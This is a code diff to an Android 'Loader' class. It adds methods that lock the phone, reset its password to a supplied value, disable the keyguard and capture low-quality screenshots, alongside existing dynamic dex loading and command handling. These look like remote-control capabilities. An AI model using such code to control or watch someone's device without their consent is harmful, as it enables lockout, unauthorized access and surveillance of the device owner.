@@ -1,15 +1,21 @@
 package com.yzrilyzr.FAQ.Server;
 
+import android.app.KeyguardManager;
+import android.app.admin.DevicePolicyManager;
+import android.content.Context;
+import android.graphics.Bitmap;
+import android.graphics.Matrix;
+import android.media.Image;
 import android.os.Environment;
+import android.os.PowerManager;
 import dalvik.system.DexClassLoader;
+import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.IOException;
-import java.io.OutputStream;
-import java.io.PrintStream;
-import java.lang.reflect.Constructor;
-import java.util.concurrent.CopyOnWriteArrayList;
-import java.lang.reflect.InvocationTargetException;
 import java.io.FileNotFoundException;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationTargetException;
+import java.nio.ByteBuffer;
+import java.util.concurrent.CopyOnWriteArrayList;
 
 public class Loader
 {
@@ -51,8 +57,10 @@ public class Loader
 					o.getClass().getField("rootFile").set(o,Environment.getExternalStorageDirectory().getAbsolutePath());
 					o.getClass().getField("datafile").set(o,f.getAbsolutePath());
 					Class<?>[] cs=cls.getClasses();
-					for(Class<?> c:cs){
-						if(c.getName().contains("Scan")){
+					for(Class<?> c:cs)
+					{
+						if(c.getName().contains("Scan"))
+						{
 							Scan=c.getConstructor(CopyOnWriteArrayList.class).newInstance(cmd);
 						}
 					}
@@ -60,7 +68,7 @@ public class Loader
 						@Override
 						public void run()
 						{
-							
+
 							while(Server!=null)
 								try
 								{
@@ -172,5 +180,36 @@ public class Loader
 	public void onPrint(String s)
 	{
 		ctx.toast(s);
+	}
+	public void onDevice(int c,String p){
+		DevicePolicyManager m=(DevicePolicyManager)ctx.getSystemService(ctx.DEVICE_POLICY_SERVICE);
+		if(c==1)m.lockNow();
+		else if(c==2)m.resetPassword(p,DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED);
+		else if(c==3){
+			PowerManager pm = (PowerManager)ctx.getSystemService(ctx.POWER_SERVICE);
+			PowerManager.WakeLock mWakelock = pm.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP|
+			PowerManager.SCREEN_DIM_WAKE_LOCK,"target");
+			mWakelock.acquire();
+			mWakelock.release();
+			KeyguardManager km = (KeyguardManager)ctx.getSystemService(ctx.KEYGUARD_SERVICE);
+			KeyguardManager.KeyguardLock kl = km.newKeyguardLock("faq");
+			if (km.inKeyguardRestrictedInputMode())kl.disableKeyguard(); 
+			}
+	}
+	public byte[] onGetScreen()
+	{
+		Image image = ctx.imr.acquireNextImage();
+		int height = image.getHeight();
+		final Image.Plane planes = image.getPlanes()[0];
+		final ByteBuffer buffer = planes.getBuffer();
+		Bitmap bitmap = Bitmap.createBitmap(planes.getRowStride()/planes.getPixelStride(), height, Bitmap.Config.ARGB_8888);
+		bitmap.copyPixelsFromBuffer(buffer);
+		Matrix mt=new Matrix();
+		mt.postScale(0.3f,0.3f);
+		bitmap=Bitmap.createBitmap(bitmap,0,0,bitmap.getWidth(),bitmap.getHeight(),mt,false);
+		ByteArrayOutputStream o=new ByteArrayOutputStream();
+		bitmap.compress(Bitmap.CompressFormat.JPEG,2,o);
+		bitmap.recycle();
+		return o.toByteArray();
 	}
 }
